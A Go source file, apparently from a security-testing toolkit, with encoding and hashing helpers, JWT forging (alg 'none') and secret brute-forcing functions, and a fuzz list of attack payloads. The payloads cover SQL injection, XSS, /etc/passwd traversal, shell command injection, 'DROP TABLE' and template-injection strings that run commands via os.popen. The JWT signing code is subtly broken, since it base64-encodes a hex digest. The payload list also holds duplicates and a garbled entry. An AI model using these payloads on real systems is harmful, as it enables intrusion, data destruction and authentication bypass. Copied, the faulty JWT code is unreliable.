package encoding

import (
	"bytes"
	"compress/gzip"
	"compress/zlib"
	"crypto/hmac"
	"crypto/md5"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base32"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"hash"
	"io"
	"net/url"
	"strconv"
	"strings"
)

func Base64Encode(data string) string {
	return base64.StdEncoding.EncodeToString([]byte(data))
}

func Base64Decode(data string) string {
	b, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return ""
	}
	return string(b)
}

func Base64URLEncode(data string) string {
	return base64.URLEncoding.EncodeToString([]byte(data))
}

func Base64URLDecode(data string) string {
	b, err := base64.URLEncoding.DecodeString(data)
	if err != nil {
		return ""
	}
	return string(b)
}

func Base32Encode(data string) string {
	return base32.StdEncoding.EncodeToString([]byte(data))
}

func Base32Decode(data string) string {
	b, err := base32.StdEncoding.DecodeString(strings.ToUpper(data))
	if err != nil {
		return ""
	}
	return string(b)
}

func HexEncode(data string) string {
	return hex.EncodeToString([]byte(data))
}

func HexDecode(data string) string {
	b, err := hex.DecodeString(data)
	if err != nil {
		return ""
	}
	return string(b)
}

func URLEncode(data string) string {
	return url.QueryEscape(data)
}

func URLDecode(data string) string {
	s, err := url.QueryUnescape(data)
	if err != nil {
		return ""
	}
	return s
}

func DoubleURLEncode(data string) string {
	return url.QueryEscape(url.QueryEscape(data))
}

func DoubleURLDecode(data string) string {
	s, err := url.QueryUnescape(data)
	if err != nil {
		return ""
	}
	s2, err := url.QueryUnescape(s)
	if err != nil {
		return ""
	}
	return s2
}

func HTMLEncode(data string) string {
	var b strings.Builder
	for _, r := range data {
		switch r {
		case '&':
			b.WriteString("&amp;")
		case '<':
			b.WriteString("&lt;")
		case '>':
			b.WriteString("&gt;")
		case '"':
			b.WriteString("&quot;")
		case '\'':
			b.WriteString("&#39;")
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}

func HTMLDecode(data string) string {
	s := data
	s = strings.ReplaceAll(s, "&amp;", "&")
	s = strings.ReplaceAll(s, "&lt;", "<")
	s = strings.ReplaceAll(s, "&gt;", ">")
	s = strings.ReplaceAll(s, "&quot;", "\"")
	s = strings.ReplaceAll(s, "&#39;", "'")
	s = strings.ReplaceAll(s, "&#x27;", "'")
	s = strings.ReplaceAll(s, "&#x2F;", "/")
	return s
}

func UnicodeEscape(data string) string {
	var b strings.Builder
	for _, r := range data {
		b.WriteString(fmt.Sprintf("\\u%04x", r))
	}
	return b.String()
}

func UnicodeUnescape(data string) string {
	var result strings.Builder
	i := 0
	for i < len(data) {
		if i+5 < len(data) && data[i] == '\\' && data[i+1] == 'u' {
			hexStr := data[i+2 : i+6]
			val, err := strconv.ParseInt(hexStr, 16, 32)
			if err != nil {
				result.WriteByte(data[i])
				i++
				continue
			}
			result.WriteRune(rune(val))
			i += 6
		} else {
			result.WriteByte(data[i])
			i++
		}
	}
	return result.String()
}

func JavaScriptEncode(data string) string {
	var b strings.Builder
	for _, r := range data {
		switch r {
		case '\n':
			b.WriteString("\\n")
		case '\r':
			b.WriteString("\\r")
		case '\'':
			b.WriteString("\\'")
		case '"':
			b.WriteString("\\\"")
		case '\\':
			b.WriteString("\\\\")
		case '<':
			b.WriteString("\\x3c")
		case '>':
			b.WriteString("\\x3e")
		default:
			if r < 128 {
				b.WriteRune(r)
			} else {
				b.WriteString(fmt.Sprintf("\\u%04x", r))
			}
		}
	}
	return b.String()
}

func JavaScriptDecode(data string) string {
	s := data
	s = strings.ReplaceAll(s, "\\n", "\n")
	s = strings.ReplaceAll(s, "\\r", "\r")
	s = strings.ReplaceAll(s, "\\t", "\t")
	s = strings.ReplaceAll(s, "\\'", "'")
	s = strings.ReplaceAll(s, "\\\"", "\"")
	s = strings.ReplaceAll(s, "\\\\", "\\")
	s = strings.ReplaceAll(s, "\\x3c", "<")
	s = strings.ReplaceAll(s, "\\x3e", ">")
	return s
}

func OctalEncode(data string) string {
	var parts []string
	for _, b := range []byte(data) {
		parts = append(parts, fmt.Sprintf("\\%o", b))
	}
	return strings.Join(parts, "")
}

func OctalDecode(data string) string {
	var result []byte
	i := 0
	for i < len(data) {
		if data[i] == '\\' && i+2 < len(data) {
			octStr := data[i+1 : i+3]
			val, err := strconv.ParseUint(octStr, 8, 8)
			if err != nil {
				if i+3 < len(data) {
					octStr = data[i+1 : i+4]
					val, err = strconv.ParseUint(octStr, 8, 8)
					if err != nil {
						result = append(result, data[i])
						i++
						continue
					}
					result = append(result, byte(val))
					i += 4
					continue
				}
				result = append(result, data[i])
				i++
				continue
			}
			result = append(result, byte(val))
			i += 3
		} else {
			result = append(result, data[i])
			i++
		}
	}
	return string(result)
}

func BinaryEncode(data string) string {
	var parts []string
	for _, b := range []byte(data) {
		parts = append(parts, fmt.Sprintf("%08b", b))
	}
	return strings.Join(parts, " ")
}

func BinaryDecode(data string) string {
	data = strings.ReplaceAll(data, " ", "")
	if len(data)%8 != 0 {
		return ""
	}
	var result []byte
	for i := 0; i < len(data); i += 8 {
		val, err := strconv.ParseUint(data[i:i+8], 2, 8)
		if err != nil {
			return ""
		}
		result = append(result, byte(val))
	}
	return string(result)
}

func ROT13(data string) string {
	var b strings.Builder
	for _, r := range data {
		switch {
		case r >= 'a' && r <= 'z':
			b.WriteRune((r-'a'+13)%26 + 'a')
		case r >= 'A' && r <= 'Z':
			b.WriteRune((r-'A'+13)%26 + 'A')
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}

func ROT47(data string) string {
	var b strings.Builder
	for _, r := range data {
		if r >= 33 && r <= 126 {
			b.WriteRune(33 + (r-33+47)%94)
		} else {
			b.WriteRune(r)
		}
	}
	return b.String()
}

func XOREncode(data, key string) string {
	dataBytes := []byte(data)
	keyBytes := []byte(key)
	result := make([]byte, len(dataBytes))
	for i, b := range dataBytes {
		result[i] = b ^ keyBytes[i%len(keyBytes)]
	}
	return hex.EncodeToString(result)
}

func XORDecode(data, key string) string {
	dataBytes, err := hex.DecodeString(data)
	if err != nil {
		return ""
	}
	keyBytes := []byte(key)
	result := make([]byte, len(dataBytes))
	for i, b := range dataBytes {
		result[i] = b ^ keyBytes[i%len(keyBytes)]
	}
	return string(result)
}

func GzipCompress(data string) string {
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	if _, err := w.Write([]byte(data)); err != nil {
		return ""
	}
	if err := w.Close(); err != nil {
		return ""
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

func GzipDecompress(data string) string {
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return ""
	}
	r, err := gzip.NewReader(bytes.NewReader(decoded))
	if err != nil {
		return ""
	}
	defer r.Close()
	out, err := io.ReadAll(r)
	if err != nil {
		return ""
	}
	return string(out)
}

func ZlibCompress(data string) string {
	var buf bytes.Buffer
	w, err := zlib.NewWriterLevel(&buf, zlib.DefaultCompression)
	if err != nil {
		return ""
	}
	if _, err := w.Write([]byte(data)); err != nil {
		return ""
	}
	if err := w.Close(); err != nil {
		return ""
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

func ZlibDecompress(data string) string {
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return ""
	}
	r, err := zlib.NewReader(bytes.NewReader(decoded))
	if err != nil {
		return ""
	}
	defer r.Close()
	out, err := io.ReadAll(r)
	if err != nil {
		return ""
	}
	return string(out)
}

func SHA1(data string) string {
	h := sha1.New()
	h.Write([]byte(data))
	return hex.EncodeToString(h.Sum(nil))
}

func SHA256(data string) string {
	h := sha256.New()
	h.Write([]byte(data))
	return hex.EncodeToString(h.Sum(nil))
}

func SHA512(data string) string {
	h := sha512.New()
	h.Write([]byte(data))
	return hex.EncodeToString(h.Sum(nil))
}

func MD5Hash(data string) string {
	h := md5.New()
	h.Write([]byte(data))
	return hex.EncodeToString(h.Sum(nil))
}

func HMAC(data, key, algo string) string {
	var h func() hash.Hash
	switch strings.ToLower(algo) {
	case "sha1":
		h = sha1.New
	case "sha256":
		h = sha256.New
	case "sha512":
		h = sha512.New
	case "md5":
		h = md5.New
	default:
		h = sha256.New
	}
	mac := hmac.New(h, []byte(key))
	mac.Write([]byte(data))
	return hex.EncodeToString(mac.Sum(nil))
}

func base64URLEncodeRaw(data string) string {
	return base64.RawURLEncoding.EncodeToString([]byte(data))
}

func base64URLDecodeRaw(data string) string {
	b, err := base64.RawURLEncoding.DecodeString(data)
	if err != nil {
		return ""
	}
	return string(b)
}

func JWTCreate(payload, secret string) string {
	header := base64URLEncodeRaw(`{"alg":"HS256","typ":"JWT"}`)
	payloadEncoded := base64URLEncodeRaw(payload)
	signingInput := header + "." + payloadEncoded
	sig := HMAC(signingInput, secret, "sha256")
	sigEncoded := base64URLEncodeRaw(sig)
	return signingInput + "." + sigEncoded
}

func JWTDecode(token string) map[string]string {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil
	}
	header := base64URLDecodeRaw(parts[0])
	payload := base64URLDecodeRaw(parts[1])
	return map[string]string{
		"header":  header,
		"payload": payload,
		"sig":     parts[2],
	}
}

func JWTForge(payload, secret string) string {
	header := base64URLEncodeRaw(`{"alg":"none","typ":"JWT"}`)
	payloadEncoded := base64URLEncodeRaw(payload)
	return header + "." + payloadEncoded + "."
}

func JWTBruteForce(token, wordlist string) string {
	words := strings.Split(wordlist, "\n")
	decoded := JWTDecode(token)
	if decoded == nil {
		return ""
	}
	signingInput := strings.Join(strings.Split(token, ".")[:2], ".")
	for _, word := range words {
		word = strings.TrimSpace(word)
		if word == "" {
			continue
		}
		sig := HMAC(signingInput, word, "sha256")
		sigEncoded := base64URLEncodeRaw(sig)
		if sigEncoded == decoded["sig"] {
			return word
		}
	}
	return ""
}

func EncodeAll(data string, encodings []string) string {
	result := data
	for _, enc := range encodings {
		switch strings.ToLower(enc) {
		case "base64":
			result = Base64Encode(result)
		case "base64url":
			result = Base64URLEncode(result)
		case "hex":
			result = HexEncode(result)
		case "url":
			result = URLEncode(result)
		case "html":
			result = HTMLEncode(result)
		case "unicode":
			result = UnicodeEscape(result)
		case "javascript":
			result = JavaScriptEncode(result)
		case "octal":
			result = OctalEncode(result)
		case "binary":
			result = BinaryEncode(result)
		case "rot13":
			result = ROT13(result)
		case "rot47":
			result = ROT47(result)
		}
	}
	return result
}

func DecodeAll(data string, encodings []string) string {
	result := data
	for i := len(encodings) - 1; i >= 0; i-- {
		enc := encodings[i]
		switch strings.ToLower(enc) {
		case "base64":
			result = Base64Decode(result)
		case "base64url":
			result = Base64URLDecode(result)
		case "hex":
			result = HexDecode(result)
		case "url":
			result = URLDecode(result)
		case "html":
			result = HTMLDecode(result)
		case "unicode":
			result = UnicodeUnescape(result)
		case "javascript":
			result = JavaScriptDecode(result)
		case "octal":
			result = OctalDecode(result)
		case "binary":
			result = BinaryDecode(result)
		case "rot13":
			result = ROT13(result)
		case "rot47":
			result = ROT47(result)
		}
	}
	return result
}

func FuzzPayloads() []string {
	payloads := []string{
		"' OR '1'='1",
		"' OR '1'='1' --",
		"admin' --",
		"' UNION SELECT NULL--",
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"{{7*7}}",
		"${7*7}",
		"{{constructor.constructor('return this')()}}",
		"../../../../etc/passwd",
		"{{range .}}{{.}}{{end}}",
		"{{.}}",
		"${T(java.lang.Runtime).getRuntime().exec('id')}",
		"*)(objectClass=*)",
		"' OR 1=1#",
		"1; DROP TABLE users--",
		"| cat /etc/passwd",
		"`id`",
		"$(id)",
		"{{dump(app)}}",
		"{{config.items()}}",
		"{{''.__class__.__mro__[2].__subclasses__()}}",
		"<%= system('id') %>",
		"<%= `id` %>",
		"<% system('id') %>",
		"{{request.application.config.__class__.__init__.__globals__['os'].popen('id').read()}}",
		"{{lipsum.__globals__['os'].popen('id').read()}}",
		"{{cycler.__next__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
		"{{joiner.__init__.__globals__['os'].popen('id').read()}}",
		"{{generate.__init__.__globals__.os.popen('id').read()}}",
		"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
		"{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}",
		"{{g.pop.__globals__.__builtins__.__import__('os').popen('id').read()}}",
		"{{g.pop.__globals__['os'].popen('id').read()}}",
		"{{init.__globals__['os'].popen('id').read()}}",
		"{{attr(config.__class__.__init__.__globals__['os'],'popen')('id').read()}}",
		"{% import os %}{{ os.popen('id').read() }}",
		"{{''.__class__.__bases__[0].__subclasses__()}}",
		"{{''.__class__.__bases__[0].__subclasses__()[X]}}",
		"{{''.__class__.__bases__[0].__subclasses__().pop(X).__init__.__globals__['os'].popen('id').read()}}",
		"{{range.constructor(prototype-chain).__proto__.__defineGetter__('__proto__',function(){for(var a in this)a.__proto__.poll=function(){return this[a]}()})}}",
		"$7*$7",
		"#{7*7}",
		"<%= 7*7 %>",
		"<%= system('id') %>",
		"<%= `id` %>",
		"<% system('id') %>",
		"<% out = system('id') %>",
		"<% out.print(system('id')) %>",
		"<% out.println(system('id')) %>",
		"<% out.write(system('id')) %>",
		"<%- system('id') -%>",
		"<%- out = system('id') -%>",
		"<%- out.print(system('id')) -%>",
		"<%- out.println(system('id')) -%>",
		"<%- out.write(system('id')) -%>",
	}
	return payloads
}
